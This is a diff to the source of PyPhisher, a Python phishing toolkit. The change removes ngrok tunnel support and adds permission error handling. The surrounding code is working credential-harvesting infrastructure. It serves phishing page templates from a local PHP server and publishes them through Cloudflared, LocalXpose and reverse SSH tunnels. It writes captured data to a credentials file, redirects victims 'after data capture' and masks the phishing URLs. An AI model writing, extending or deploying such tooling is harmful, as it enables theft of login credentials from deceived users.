@@ -150,13 +150,6 @@ logo = f"""
 {cyan}        |___/  {" "*11}      {red}[By \x4b\x61\x73\x52\x6f\x75\x64\x72\x61]
 """
 
-nr_help = f"""
-{info}Steps: {nc}
-{blue}[1]{yellow} Go to {green}https://ngrok.com
-{blue}[2]{yellow} Create an account 
-{blue}[3]{yellow} Login to your account
-{blue}[4]{yellow} Visit {green}https://dashboard.ngrok.com/get-started/your-authtoken{yellow} and copy your authtoken
-"""
 
 lx_help = f"""
 {info}Steps: {nc}
@@ -168,8 +161,8 @@ lx_help = f"""
 
 packages = [ "php", "ssh" ]
 modules = [ "requests", "bs4", "rich" ]
-tunnelers = [ "ngrok", "cloudflared", "loclx" ]
-processes = [ "php", "ssh", "ngrok", "cloudflared", "loclx", "localxpose", ]
+tunnelers = [ "cloudflared", "loclx" ]
+processes = [ "php", "ssh", "cloudflared", "loclx", "localxpose", ]
 
 
 try:
@@ -225,7 +218,7 @@ columns = get_terminal_size().columns
 repo_url = "https://github.com/KasRoudra/PyPhisher"
 websites_url = f"{repo_url}/releases/download/v{version}/websites.zip" # "https://github.com/KasRoudra/PyPhisher/releases/latest/download/websites.zip" 
 
-# CF = Cloudflared, NR = Ngrok, LX = LocalXpose, LHR = LocalHostRun
+# CF = Cloudflared, LX = LocalXpose, LHR = LocalHostRun
 
 home = getenv("HOME")
 ssh_dir = f"{home}/.ssh"
@@ -253,12 +246,10 @@ mask = ""
 default_port = 8080
 default_tunneler = "Cloudflared"
 default_template = "60"
-nr_command = f"{tunneler_dir}/ngrok"
 cf_command = f"{tunneler_dir}/cloudflared"
 lx_command = f"{tunneler_dir}/loclx"
 if isdir("/data/data/com.termux/files/home"):
     termux = True
-    nr_command = f"termux-chroot {nr_command}"
     cf_command = f"termux-chroot {cf_command}"
     lx_command = f"termux-chroot {lx_command}"
     saved_file = "/sdcard/.creds.txt"
@@ -274,8 +265,8 @@ argparser = ArgumentParser()
 argparser.add_argument("-p", "--port", type=int, default=default_port, help=f"PyPhisher's server port [Default : {default_port}]")
 argparser.add_argument("-o", "--option", help="PyPhisher's template index [Default : null]")
 argparser.add_argument("-t", "--tunneler", default=default_tunneler, help=f"Tunneler to be chosen while url shortening [Default : {default_tunneler}]")
-argparser.add_argument("-r", "--region", help="Region for ngrok and loclx [Default: auto]")
-argparser.add_argument("-s", "--subdomain", help="Subdomain for ngrok and loclx [Pro Account] (Default: null)")
+argparser.add_argument("-r", "--region", help="Region for loclx [Default: auto]")
+argparser.add_argument("-s", "--subdomain", help="Subdomain for loclx [Pro Account] (Default: null)")
 argparser.add_argument("-u", "--url", help="Redirection url after data capture [Default : null]")
 argparser.add_argument("-m", "--mode", help="Mode of PyPhisher [Default: normal]")
 argparser.add_argument("-e", "--troubleshoot", help="Troubleshoot a tunneler [Default: null]")
@@ -299,7 +290,6 @@ update = args.noupdate
 local_url = f"127.0.0.1:{port}"
 
 ts_commands = {
-    "ngrok": f"{nr_command} http {port}",
     "cloudflared": f"{cf_command} tunnel -url {local_url}",
     "localxpose": f"{lx_command} tunnel http -t {local_url}",
     "localhostrun": f"ssh -R 80:{local_url} localhost.run -T -n",
@@ -561,8 +551,6 @@ def installer(package, package_name=None):
                     shell(f"{pacman} install -y {package_name}")
                 break
     if is_installed("brew"):
-        if not is_installed("ngrok"):
-            shell("brew install ngrok/ngrok/ngrok")
         if not is_installed("cloudflare"):
             shell("brew install cloudflare/cloudflare/cloudflared")
         if not is_installed("localxpose"):
@@ -760,29 +748,7 @@ def show_options(sites):
     lolcat(options)
 
 
-
-# Set up ngrok authtoken to work with ngrok links
-def nr_token():
-    global nr_command
-    while True:
-        if isfile(f"{home}/.config/ngrok/ngrok.yml") or isfile(f"{home}/.ngrok2/ngrok.yml"):
-             break
-        has_token = input(f"\n{ask}Do you have ngrok authtoken? [y/N/help]: {green}")
-        if has_token == "y":
-            token = input(f"\n{ask}Enter your ngrok authtoken: {green}")
-            shell(f"{nr_command} config add-authtoken {token}")
-            sleep(1)
-            break
-        elif has_token == "help":
-            sprint(nr_help, 0.01)
-            sleep(3)
-        elif has_token in ["n", ""]:
-            break
-        else:
-            print(f"\n{error}Invalid input '{has_token}'!")
-            sleep(1)
-
-# Set up ngrok authtoken to work with ngrok links
+# Set up loclx authtoken to work with loclx links
 def lx_token():
     global lx_command
     while True:
@@ -920,7 +886,7 @@ def about():
         return
 
 
-# Optional function for ngrok url masking
+# Optional function for url masking
 def masking(url):
     cust = input(f"\n{ask}{bcyan}Wanna try custom link? {green}[{blue}y or press enter to skip{green}] : {yellow}")
     if cust in [ "", "n", "N", "no" ]:
@@ -997,7 +963,7 @@ def updater():
 
 # Installing packages and downloading tunnelers
 def requirements():
-    global termux, nr_command, cf_command, lx_command, is_mail_ok, email, password, receiver
+    global termux, cf_command, lx_command, is_mail_ok, email, password, receiver
     if termux:
         try:
             if not isfile(saved_file):
@@ -1006,6 +972,15 @@ def requirements():
                 data = checkfile.read()
         except:
             shell("termux-setup-storage")
+        try:
+            if not isfile(saved_file):
+                mknod(saved_file)
+            with open(saved_file) as checkfile:
+                data = checkfile.read()
+        except:
+            print(f"\n{error}You haven't allowed storage permission for termux. Closing \x50\x79\x50\x68\x69\x73\x68\x65\x72!\n")
+            sleep(2)
+            pexit()
     internet()
     if termux:
         if not is_installed("proot"):
@@ -1024,65 +999,45 @@ def requirements():
     osinfo = uname()
     platform = osinfo.system.lower()
     architecture = osinfo.machine
-    isngrok = isfile(f"{tunneler_dir}/ngrok")
     iscloudflared = isfile(f"{tunneler_dir}/cloudflared")
     isloclx = isfile(f"{tunneler_dir}/loclx")
-    delete("ngrok.zip", "ngrok.tgz", "cloudflared.tgz", "cloudflared", "loclx.zip")
+    delete("cloudflared.tgz", "cloudflared", "loclx.zip")
     internet()
     if "linux" in platform:
         if "arm64" in architecture or "aarch64" in architecture:
-            if not isngrok:
-                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm64.tgz", "ngrok.tgz")
             if not iscloudflared:
                 download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64", f"{tunneler_dir}/cloudflared")
             if not isloclx:
                 download("https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip", "loclx.zip")
         elif "arm" in architecture:
-            if not isngrok:
-                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-arm.tgz", "ngrok.tgz")
             if not iscloudflared:
                 download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm", f"{tunneler_dir}/cloudflared")
             if not isloclx:
                 download("https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip", "loclx.zip")
         elif "x86_64" in architecture or "amd64" in architecture:
-            if not isngrok:
-                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-amd64.tgz", "ngrok.tgz")
             if not iscloudflared:
                 download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", f"{tunneler_dir}/cloudflared")
             if not isloclx:
                 download("https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip", "loclx.zip")
         else:
-            if not isngrok:
-                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-linux-386.tgz", "ngrok.tgz")
             if not iscloudflared:
                 download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386", f"{tunneler_dir}/cloudflared")
             if not isloclx:
                 download("https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip", "loclx.zip")
-        if isfile("ngrok.tgz"):
-            extract("ngrok.tgz", f"{tunneler_dir}")
-            remove("ngrok.tgz")
     elif "darwin" in platform:
         if "x86_64" in architecture or "amd64" in architecture:
-            if not isngrok:
-                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-amd64.zip", "ngrok.zip")
-                extract("ngrok.zip", f"{tunneler_dir}")
-                remove("ngrok.zip")
             if not iscloudflared:
                 download("https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz", "cloudflared.tgz")
                 extract("cloudflared.tgz", f"{tunneler_dir}")
             if not isloclx:
                 download("https://api.localxpose.io/api/v2/downloads/loclx-darwin-amd64.zip", "loclx.zip")
         elif "arm64" in architecture or "aarch64" in architecture:
-            if not isngrok:
-                download("https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-v3-stable-darwin-arm64.zip", "ngrok.zip")
-                extract("ngrok.zip", f"{tunneler_dir}")
-                remove("ngrok.zip")
             if not iscloudflared:
                 print(f"{error}Device architecture unknown. Download cloudflared manually!")
             if not isloclx:
                 download("https://api.localxpose.io/api/v2/downloads/loclx-darwin-arm64.zip", "loclx.zip")
         else:
-            print(f"{error}Device architecture unknown. Download ngrok/cloudflared/loclx manually!")
+            print(f"{error}Device architecture unknown. Download cloudflared/loclx manually!")
             sleep(3)
     else:
         print(f"{error}Device not supported!")
@@ -1097,8 +1052,6 @@ def requirements():
         if is_running(process):
             print(f"\n{error}Previous {process} still running! Please restart terminal and try again{nc}")
             pexit()
-    if is_installed("ngrok"):
-        nr_command = "ngrok"
     if is_installed("cloudflared"):
         cf_command = "cloudflared"
     if is_installed("localxpose"):
@@ -1123,7 +1076,6 @@ def requirements():
         extract("websites.zip", sites_dir)
         remove("websites.zip")
     if mode != "test":
-        nr_token()
         lx_token()
         ssh_key()
     email_config = cat(email_file)
@@ -1235,7 +1187,11 @@ def server():
     for logfile in [php_file, cf_file, lx_file, lhr_file]:
         delete(logfile)
         if not isfile(logfile):
-            mknod(logfile)
+            try:
+                mknod(logfile)
+            except:
+                sprint(f"\n{error}Your terminal lacks file/folder permission! Fix it or run me from docker!")
+                pexit()
     php_log = open(php_file, "w")
     cf_log = open(cf_file, "w")
     lx_log = open(lx_file, "w")
@@ -1260,7 +1216,6 @@ def server():
         arguments = f"--region {region}"
     if subdomain is not None:
         arguments = f"{arguments} --subdomain {subdomain}"
-    bgtask(f"{nr_command} http {arguments} {local_url}")
     bgtask(f"{cf_command} tunnel -url {local_url}", stdout=cf_log, stderr=cf_log)
     bgtask(f"{lx_command} tunnel --raw-mode http --https-redirect {arguments} -t {local_url}", stdout=lx_log, stderr=lx_log)
     if key:
@@ -1268,16 +1223,6 @@ def server():
     else:
         bgtask(f"ssh -R 80:{local_url} nokey@localhost.run -T -n", stdout=lhr_log, stderr=lhr_log)
     sleep(10)
-    try:
-        nr_api = get("http://127.0.0.1:4040/api/tunnels").json()
-        nr_url = nr_api["tunnels"][0]["public_url"]
-    except Exception as e:
-        append(e, error_file)
-        nr_url = ""
-    if nr_url != "":
-        nr_success=True
-    else:
-        nr_success=False
     cf_success = False
     for i in range(10):
         cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
@@ -1299,22 +1244,18 @@ def server():
             lhr_success = True
             break
         sleep(1)
-    if nr_success or cf_success or lx_success or lhr_success:
+    if cf_success or lx_success or lhr_success:
         sprint(f"\n{info}Your urls are given below:\n")
         if mode == "test":
             print(f"\n{info}URL generation has completed successfully!")
-            print(f"\n{info}Ngrok: {nr_success}, CloudFlared: {cf_success}, LocalXpose: {lx_success}, LocalHR: {lhr_success}")
+            print(f"\n{info}CloudFlared: {cf_success}, LocalXpose: {lx_success}, LocalHR: {lhr_success}")
             pexit()
-        if nr_success:
-            url_manager(nr_url, "Ngrok")
         if cf_success:
             url_manager(cf_url, "CloudFlared")
         if lx_success:
             url_manager(lx_url, "LocalXpose")
         if lhr_success:
             url_manager(lhr_url, "LocalHostRun")
-        if nr_success and tunneler.lower() in [ "ngrok", "nr" ]:
-            masking(nr_url)
         elif lx_success and tunneler.lower() in [ "loclx", "lx" ]:
             masking(lx_url)
         elif lhr_success and tunneler.lower() in [ "localhostrun", "lhr" ]:
